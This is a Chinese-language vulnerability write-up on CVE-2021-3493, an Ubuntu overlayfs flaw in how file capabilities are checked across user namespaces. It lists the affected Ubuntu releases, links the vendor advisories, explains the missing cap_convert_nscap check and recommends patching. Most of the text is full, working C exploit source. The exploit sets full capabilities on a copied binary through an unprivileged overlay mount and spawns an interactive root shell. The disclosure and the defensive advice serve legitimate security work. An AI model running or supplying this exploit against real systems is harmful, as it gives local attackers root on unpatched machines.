## **漏洞摘要**

Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。

## CVE-2021-3493

linux内核中的overlayfs实现未就用户名称空间正确验证底层文件系统中文件的文件功能设置。由于无特权的用户名称空间以及Ubuntu内核中附带的允许无特权的覆盖挂载的补丁的组合，攻击者可以使用它来获得提升的特权,内核中的overlayfs实现无法正确验证文件系统功能在用户名称空间方面的应用。本地攻击者可以使用它来获得更高的特权。

##  **受影响的版本**

    
    
    Ubuntu 20.10
    
    Ubuntu 20.04 LTS
    
    Ubuntu 18.04 LTS
    
    Ubuntu 16.04 LTS
    
    Ubuntu 14.04 ESM

##  **供应商回应**

“我们今天在以下位置发布了有关此问题的安全公告

> https://ubuntu.com/security/notices/USN-4915-1  
> https://ubuntu.com/security/notices/USN-4916-1  
> https://ubuntu.com/security/notices/USN-4917- 1

并在我们的CVE跟踪器中公开该问题：

https://ubuntu.com/security/CVE-2021-3493

以下是消息的内容已发送到oss-security列表：

https://www.openwall.com/lists/oss-security/2021/04/16/1

##  **漏洞分析**

Linux支持`file capabilities`存储在扩展文件属性中，这些属性的作用类似于setuid-bit，但可以更细化。使用伪代码设置文件功能的简化过程如下所示:

    
    
    setxattr(...):
        if cap_convert_nscap(...) is not OK:
            then fail
        vfs_setxattr(...)

重要的调用是`cap_convert_nscap`，它检查有关名称空间的权限。

如果我们从自己的名称空间和自己的挂载上设置文件功能，则没有问题，并且我们有权这样做。问题是，当OverlayFS将此操作转发到基础文件系统时，它仅调用`vfs_setxattr`和跳过中的检查`cap_convert_nscap`。

这允许在外部名称空间/挂载中的文件上设置任意功能，这些文件也将在执行过程中应用。

在Linux 5.11中，对的调用`cap_convert_nscap`已移入`vfs_setxattr`，因此它不再易受攻击。

##  **漏洞复现演示：**

![](https://image.3001.net/images/20210423/1619187083_6082d58b321d416112bb9.gif!small)

##  **Exploit**

    
    
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <err.h>
    #include <errno.h>
    #include <sched.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mount.h>
    //#include <attr/xattr.h>
    //#include <sys/xattr.h>
    int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
    #define DIR_BASE    "./ovlcap"
    #define DIR_WORK    DIR_BASE "/work"
    #define DIR_LOWER   DIR_BASE "/lower"
    #define DIR_UPPER   DIR_BASE "/upper"
    #define DIR_MERGE   DIR_BASE "/merge"
    #define BIN_MERGE   DIR_MERGE "/magic"
    #define BIN_UPPER   DIR_UPPER "/magic"
    static void xmkdir(const char *path, mode_t mode)
    {
        if (mkdir(path, mode) == -1 && errno != EEXIST)
            err(1, "mkdir %s", path);
    }
    static void xwritefile(const char *path, const char *data)
    {
        int fd = open(path, O_WRONLY);
        if (fd == -1)
            err(1, "open %s", path);
        ssize_t len = (ssize_t) strlen(data);
        if (write(fd, data, len) != len)
            err(1, "write %s", path);
        close(fd);
    }
    static void xcopyfile(const char *src, const char *dst, mode_t mode)
    {
        int fi, fo;
        if ((fi = open(src, O_RDONLY)) == -1)
            err(1, "open %s", src);
        if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
            err(1, "open %s", dst);
        char buf[4096];
        ssize_t rd, wr;
        for (;;) {
            rd = read(fi, buf, sizeof(buf));
            if (rd == 0) {
                break;
            } else if (rd == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "read %s", src);
            }
            char *p = buf;
            while (rd > 0) {
                wr = write(fo, p, rd);
                if (wr == -1) {
                    if (errno == EINTR)
                        continue;
                    err(1, "write %s", dst);
                }
                p += wr;
                rd -= wr;
            }
        }
        close(fi);
        close(fo);
    }
    static int exploit()
    {
        char buf[4096];
        sprintf(buf, "rm -rf '%s/'", DIR_BASE);
        system(buf);
        xmkdir(DIR_BASE, 0777);
        xmkdir(DIR_WORK,  0777);
        xmkdir(DIR_LOWER, 0777);
        xmkdir(DIR_UPPER, 0777);
        xmkdir(DIR_MERGE, 0777);
        uid_t uid = getuid();
        gid_t gid = getgid();
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
            err(1, "unshare");
        xwritefile("/proc/self/setgroups", "deny");
        sprintf(buf, "0 %d 1", uid);
        xwritefile("/proc/self/uid_map", buf);
        sprintf(buf, "0 %d 1", gid);
        xwritefile("/proc/self/gid_map", buf);
        sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
        if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
            err(1, "mount %s", DIR_MERGE);
        // all+ep
        char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
        xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
        if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
            err(1, "setxattr %s", BIN_MERGE);
        return 0;
    }
    int main(int argc, char *argv[])
    {
        if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
            setuid(0);
            setgid(0);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            err(1, "execl /bin/bash");
        }
        pid_t child = fork();
        if (child == -1)
            err(1, "fork");
        if (child == 0) {
            _exit(exploit());
        } else {
            waitpid(child, NULL, 0);
        }
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
        err(1, "execl %s", BIN_UPPER);
    }

![](https://image.3001.net/images/20210423/1619187262_6082d63ef09bd60b8435b.png!small)

##  **防御建议**

更新系统软件包版本。详细版本信息请参考供应商的安全公告。

https://ubuntu.com/security/notices/USN-4915-1

https://ubuntu.com/security/notices/USN-4916-1

https://ubuntu.com/security/notices/USN-4917-1

###  **参考链接**

https://ubuntu.com/security/CVE-2021-3493

https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/

